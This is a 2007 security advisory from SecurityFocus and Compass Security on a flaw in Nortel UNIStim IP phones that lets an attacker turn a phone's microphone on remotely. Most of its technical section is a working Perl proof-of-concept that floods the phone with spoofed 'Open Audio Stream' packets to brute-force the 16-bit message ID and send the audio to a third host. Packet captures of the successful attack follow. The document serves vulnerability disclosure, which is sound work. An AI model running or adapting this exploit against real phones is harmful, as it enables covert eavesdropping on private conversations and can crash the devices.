source: http://www.securityfocus.com/bid/26120/info

Multiple Nortel Networks UNIStim VoIP telephony products are prone to a remote vulnerability that may allow eavesdropping.

Attackers can exploit this issue to open an audio channel with the phone's microphone. This will allow attackers to remotely eavesdrop on arbitrary conversations and gain potentially sensitive information that could aid in further attacks. 

#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# Product: IP Phone
# Vendor:  Nortel
# Subject: IP Phone Surveillance Mode
# Risk:    High
# Effect:  Currently exploitable
# Author:  Daniel Stirnimann (daniel.stirnimann (at) csnc (dot) ch)
# Date:    October, 18th 2007
#
#############################################################

Introduction:
-------------
An IP phone can be put into surveillance mode if the correct UNIStim message
is sent to the IP phone. The UNIStim message ID must match the expected ID
between the signaling server and the IP phone. The protocol uses only 16bit
for the ID number. If a malicious user sends 65536 spoofed UNIStim message
with all possible ID numbers he is able to successfully launch this attack.

Nortel has noted this as:
Title:  UNIStim IP Phone Remote Eavesdrop Potential Vulnerability
Number: 2007008383
http://support.nortel.com/go/main.jsp?cscat=SECUREADVISORY

Vulnerable:
-----------
Nortel IP Phone 1140E
IP Softphone 2050
and others.

See associated products on the Nortel advisory.

Vulnerability Management:
-------------------------
June 2007:    Vulnerability found
June 2007:    Nortel Security notified
October 2007: Nortel Advisory & Patches available
October 2007: Compass Security Information

Remediation:
------------
Follow the recommended actions for the affected systems, as identified in
the Nortel Advisory.

Technical Description:
----------------------
A malicious user sends n spoofed "Open Audio Stream" messages to an IP phone
which it intents to put into surveillance mode. If the ID of the message
matches the ID number between the signaling server and the IP phone, the
message is accepted and the audio stream is opened to the host given in
the "Open Audio Stream" message.

To increase the probability of exploiting this vulnerability the number of
spoofed messages need to be as close as possible to the maximum. The RUDP
datagram uses a 32bit field for the ID number. However, the implementation
of Nortel makes only use of 16bit. That means if we send 65536 messages
with different IDs we will hit the correct ID by 100%. However, there is
a small catch, if the number of spoofed messages is too high, the IP phone
will crash and a manual reboot is required to bring it back online.

Proof-Of-Concept Source Code:
-----------------------------

#!/usr/bin/perl
#
#
use Net::RawIP;
use strict;

my $src = "192.168.9.10";      # Signaling Server IP Address
my $dst = "192.168.10.22";     # IP Phone IP Address
my $id  = 1;                   # Initial Sequence Number (ID)
my $n   = 65535;               # Number of spoofed messages to send

# declare variables
my $srcPort = 5100;
my $dstPort = 5000;
my $content;
my $udp;
my $seqNum;
my $datagram;

print "Sending $n openaudio datagrams...\n";
for (my $i=0;$i<$n;$i++) {
   $seqNum = unpack("H*", pack("S", ($id + $i) % 65535));
   if ($seqNum =~ /^(.{2})(.{2})$/) {
       $seqNum = pack("C4", hex($4),hex($3),hex($2),hex($1));
   }
   # destination address for the audio stream is 192.168.11.201
   $content = "$seqNum\x02\x01\x16\x1a\x30\xff\x00\x00\x08\x01\x00\xb8\xb8\x06\x06\x81\x14\x50\x14\x51\x14\x50\x14\x50\xc0\xa8\x0b\xc9\x00\x00"; # 4 byte VLAN padding
   $datagram = new Net::RawIP({ip=> {tos=>0, saddr=>$src, daddr=>$dst},
      udp=>{source=>$srcPort, dest=>$dstPort}});
   $datagram->set({udp=>{len=> length($content) + 8, data=>$content}});
   $datagram->send();
}

print "Sent $n spoofed openaudio datagrams to target.\n";

Packet on the wire:
-------------------
Source                Destination           Protocol Info
192.168.9.10          192.168.10.22         RUDP     Seqno: 0x5b2, Open Audio Stream

Frame 5853 (80 bytes on wire, 80 bytes captured)
Ethernet II, Src: 00:19:e1:e2:0b:cf, Dst: 00:19:e1:e2:4a:1f
    Destination: 00:19:e1:e2:4a:1f (14.104.188.30)
    Source: 00:19:e1:e2:0b:cf (14.104.188.8)
    Type: 802.1Q Virtual LAN (0x8100)
802.1q Virtual LAN
Internet Protocol, Src Addr: 192.168.9.10 (192.168.9.10), Dst Addr: 192.168.10.22 (192.168.10.22)
User Datagram Protocol, Src Port: 5100 (5100), Dst Port: 5000 (5000)
Reliable-UDP, Seqno: 0x5b2, Payload: Unistim
UNIStim
    ..01 0110 = Address: Audio Manager (0x16)
    0... .... = Source: Network Proxy (0)
    Command length: 26
    Command byte: Open Audio Stream (0x30)
    Rx stream id: 0xff
    Tx stream id: 0x00
    Rx vocoder: G.711 Mu-Law (0x00)
    Tx vocoder: G.711 A-Law (0x08)
    Frames per packet: 1
    .... ...0 = Receive rtp from unconnected sockets: Off (0)
    00.. .... = Digit transmission mode: Dial pad key presses not sent to the far-end (0x00)
    Rtp tos: 0xb8
    Rtcp tos: 0xb8
    .... .110 = Rtp 802.1q tag: 0x06
    .... 0... = Rtp 802.1q enabled: Off (0)
    .... .110 = Rtcp 802.1q tag: 0x06
    .... 0... = Rtcp 802.1q enabled: Off (0)
    .... 0001 = Rtcp bucket id: 1
    1... .... = Qos threshold alert: On (1)
    IT rtp port: 5200
    IT rtcp port: 5201
    Far end rtp port: 5200
    Far end rtcp port: 5200
    Far end ip address: 192.168.11.201 (192.168.11.201)

Packet overview as seen on the receivers end:
---------------------------------------------
No.     Source         Destination     Protocol Info
  37870 192.168.10.22  192.168.11.201  RTP      Payload type=ITU-T G.711 PCMA
  37873 192.168.10.22  192.168.11.201  RTP      Payload type=ITU-T G.711 PCMA
  37875 192.168.10.22  192.168.11.201  RTP      Payload type=ITU-T G.711 PCMA
  37876 192.168.10.22  192.168.11.201  RTP      Payload type=ITU-T G.711 PCMA
  37877 192.168.10.22  192.168.11.201  RTP      Payload type=ITU-T G.711 PCMA